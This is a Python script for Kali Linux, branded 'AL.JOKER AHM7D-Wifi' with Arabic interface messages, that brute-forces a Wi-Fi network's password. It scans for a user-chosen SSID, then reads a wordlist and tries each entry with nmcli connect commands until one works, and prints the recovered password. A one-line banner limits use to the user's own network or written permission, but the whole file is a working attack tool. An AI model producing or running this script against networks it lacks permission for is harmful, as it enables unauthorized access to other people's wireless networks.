from __future__ import annotations

import os
import sys
import time
import shutil
import subprocess

if sys.platform != "linux":
    print("\033[1;31mهذا السكربت مخصص لـ Linux (مثلاً Kali) فقط.\033[0m")
    raise SystemExit(1)


def _run(
    cmd: list[str],
    timeout: float = 120.0,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=timeout,
    )


def _wifi_ifaces_from_iw() -> list[str]:
    r = _run(["iw", "dev"], timeout=10)
    if r.returncode != 0:
        return []
    out: list[str] = []
    for line in r.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            parts = line.split()
            if len(parts) >= 2:
                out.append(parts[1])
    return out


def _have_nmcli() -> bool:
    return shutil.which("nmcli") is not None


def _nmcli_ssids() -> set[str]:
    ssids: set[str] = set()
    _run(["nmcli", "dev", "wifi", "rescan"], timeout=25)
    time.sleep(4)
    r = _run(["nmcli", "-g", "SSID", "dev", "wifi"], timeout=90)
    if r.returncode != 0:
        return ssids
    for line in r.stdout.splitlines():
        s = line.strip()
        if s and s != "--":
            ssids.add(s)
    return ssids


def _iw_scan_ssids(iface: str) -> set[str]:
    ssids: set[str] = set()
    r = _run(["iw", "dev", iface, "scan"], timeout=120)
    if r.returncode != 0:
        return ssids
    for line in r.stdout.splitlines():
        line = line.strip()
        if line.startswith("SSID:"):
            name = line[5:].strip()
            if name:
                ssids.add(name)
    return ssids


def collect_visible_ssids(iface: str) -> set[str]:
    """يجمع أسماء الشبكات المرئية عبر واجهة الـ Wi‑Fi فقط."""
    merged: set[str] = set()
    if _have_nmcli():
        merged |= _nmcli_ssids()
    merged |= _iw_scan_ssids(iface)
    return merged


def ssid_is_visible(target: str, iface: str) -> bool:
    visible = collect_visible_ssids(iface)
    if target in visible:
        return True
    t = target.casefold()
    for s in visible:
        if s.casefold() == t:
            return True
    return False


def _iface_connected_nmcli(iface: str) -> bool:
    r = _run(["nmcli", "-t", "-f", "DEVICE,STATE", "dev"], timeout=15)
    if r.returncode != 0:
        return False
    for line in r.stdout.splitlines():
        parts = line.split(":", 1)
        if len(parts) == 2 and parts[0] == iface:
            return "connected" in parts[1].lower()
    return False


def try_connect_nmcli(ssid: str, password: str, iface: str, wait_sec: float = 8.0) -> bool:
    if not _have_nmcli():
        return False
    _run(["nmcli", "dev", "disconnect", iface], timeout=20)
    time.sleep(1)
    r = _run(
        [
            "nmcli",
            "-w",
            "40",
            "device",
            "wifi",
            "connect",
            ssid,
            "password",
            password,
            "ifname",
            iface,
        ],
        timeout=55,
    )
    time.sleep(wait_sec)
    return _iface_connected_nmcli(iface)

try:
    import pyfiglet

    Z = "\033[1;32m"
    logo = pyfiglet.figlet_format("AL.JOKER AHM7D-Wifi")
    print(Z + logo)
except Exception:
    print("\033[1;32mAL.JOKER AHM7D-Wifi\033[0m\n")

print("")
print("\033[1;33m للاستخدام على شبكتك أو بإذن كتابي فقط.\033[0m")
print("")

ifaces = _wifi_ifaces_from_iw()
if not ifaces:
    print(
        "\033[1;31mلم يُعثر على واجهة Wi‑Fi (iw dev). "
        "وصّل كرت الشبكة اللاسلكية وتأكد من التعريفات.\033[0m"
    )
    raise SystemExit(1)

if len(ifaces) == 1:
    wifi_iface = ifaces[0]
    print(f"\033[1;36mواجهة Wi‑Fi المستخدمة: {wifi_iface}\033[0m")
else:
    print("\033[1;36mواجهات Wi‑Fi المتاحة:\033[0m " + ", ".join(ifaces))
    choice = input("\033[1;34mاسم الواجهة (Enter للأولى): \033[0m").strip()
    wifi_iface = choice if choice in ifaces else ifaces[0]
    print(f"\033[1;36mالمختارة: {wifi_iface}\033[0m")

print("")
ff = input("\033[1;34mSSID (اسم الشبكة): \033[0m").strip()
if not ff:
    print("\033[1;31mاسم الشبكة فارغ.\033[0m")
    raise SystemExit(1)

print("")
print("\033[1;32mجاري مسح الشبكات عبر واجهة Wi‑Fi...\033[0m")
if not _have_nmcli():
    print(
        "\033[1;33mتنبيه: nmcli غير متوفر — الاعتماد على «iw scan» فقط "
        "(قد تحتاج صلاحيات root).\033[0m"
    )

if not ssid_is_visible(ff, wifi_iface):
    print(
        f"\033[1;31mالشبكة «{ff}» غير ظاهرة في المسح الحالي.\033[0m\n"
        "\033[1;33mلن يُجرَّب أي كلمة مرور من ملف الورد لست.\033[0m\n"
        "تأكد من التقاطب الإشارة، تشغيل الـ AP، أو جرب: sudo nmcli dev wifi rescan"
    )
    raise SystemExit(1)

print(f"\033[1;32m[√] الشبكة «{ff}» موجودة في النطاق — يمكن متابعة ملف كلمات المرور.\033[0m")
print("")

if not _have_nmcli():
    print(
        "\033[1;31mnmcli غير متوفر — لا يمكن الاتصال تلقائياً من هذا السكربت. "
        "ثبّت NetworkManager أو استخدم wpa_supplicant يدوياً.\033[0m"
    )
    raise SystemExit(1)

d = input("\033[1;32mمسار ملف الورد لست: \033[0m").strip().strip('"')
if not d or not os.path.isfile(d):
    print("\033[1;31mملف غير موجود أو مسار فارغ.\033[0m")
    raise SystemExit(1)

print("\033[1;36mبدء تجربة كلمات المرور (nmcli)...\033[0m\n")

try:
    with open(d, "r", encoding="utf-8", errors="replace") as file:
        for line in file:
            pwd = line.strip()
            if not pwd or pwd.startswith("#"):
                continue
            mask = pwd[:3] + "*" * min(len(pwd), 8) if len(pwd) > 3 else "*" * min(len(pwd), 4)
            print(f"\033[1;31mتجربة: {mask}\033[0m")
            if try_connect_nmcli(ff, pwd, wifi_iface):
                print(f"\033[1;32m[√] نجح الاتصال. كلمة المرور: {pwd}\033[0m")
                raise SystemExit(0)
            time.sleep(0.5)
except KeyboardInterrupt:
    print("\033[1;33m\nتوقف المستخدم.\033[0m")
    raise SystemExit(130)

print(
    "\033[1;31mلم تنجح أي كلمة من القائمة (أو نوع الحماية غير مدعوم / تحقق من nmcli).\033[0m"
)
raise SystemExit(1)
